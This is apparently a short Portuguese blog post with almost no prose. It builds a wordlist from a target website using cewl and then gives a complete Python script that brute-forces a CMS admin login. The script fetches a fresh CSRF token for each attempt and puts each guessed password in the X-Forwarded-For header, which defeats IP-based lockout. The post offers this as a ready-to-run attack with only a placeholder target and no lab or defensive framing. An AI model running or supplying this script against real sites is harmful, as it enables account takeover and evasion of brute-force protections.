---
title: ""
date: 2020-07-22T23:58:13-03:00
draft: false
---

## Gerando wordlist com palavras do site 

`cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/`

## Crie o arquivo brute.py

Para executa-lo basta rodar o comando:   

`$ python3 brute.py`

```py
import re
import requests

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]
#alvo
host = 'http://seualvo.com'
#url do login
login_url = host + '/admin/login'
#user
username = 'admin'
#caminho da wordlist
wordlist = open_ressources('/root/wordlists.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```